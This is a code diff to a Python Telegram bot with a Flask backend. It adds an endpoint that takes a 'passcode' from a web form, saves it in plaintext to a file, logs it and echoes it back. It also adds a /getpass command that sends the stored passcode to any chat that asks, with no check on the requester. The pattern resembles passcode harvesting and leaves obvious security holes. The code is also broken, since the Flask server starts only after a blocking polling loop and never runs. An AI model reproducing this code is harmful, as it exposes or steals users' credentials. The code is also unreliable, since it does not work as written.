@@ -8,6 +8,29 @@ WEBAPP_URL = "https://fairusss.github.io/tgbot/"
 
 app = Flask(__name__)
 
+# === FLASK ENDPOINT (RECEIVES DATA FROM JS) ===
+@app.route("/submit_data", methods=["POST"])
+def receive_data():
+    data = request.get_json()
+    passcode = data.get("passcode")
+
+    if not passcode:
+        return jsonify({"error": "no passcode"}), 400
+
+    # Save passcode to temp file
+    with open("temp_passcode.txt", "w") as f:
+        f.write(passcode)
+
+    print(f"[SERVER] Passcode received and saved: {passcode}")
+
+    # Read back (just to verify)
+    with open("temp_passcode.txt", "r") as f:
+        saved = f.read()
+        print(f"[SERVER] File contents: {saved}")
+
+    return jsonify({"status": "ok", "saved": saved})
+
+
 bot = telebot.TeleBot(TOKEN)
 # /start — показує кнопку з WebApp
 @bot.message_handler(commands=['start'])
@@ -53,9 +76,18 @@ def submit_data():
         print("Error:", e)
         return jsonify(success=False, message=str(e)), 400
 
+@bot.message_handler(commands=['getpass'])
+def get_pass(message):
+    try:
+        with open("temp_passcode.txt", "r") as f:
+            saved = f.read()
+        bot.send_message(message.chat.id, f"📄 Saved passcode: {saved}")
+    except FileNotFoundError:
+        bot.send_message(message.chat.id, "❌ No passcode saved yet.")
 
 print("Бот запущено! Очікуємо дані...")
 
 
 
 bot.infinity_polling()  
+app.run(host="0.0.0.0", port=10000)
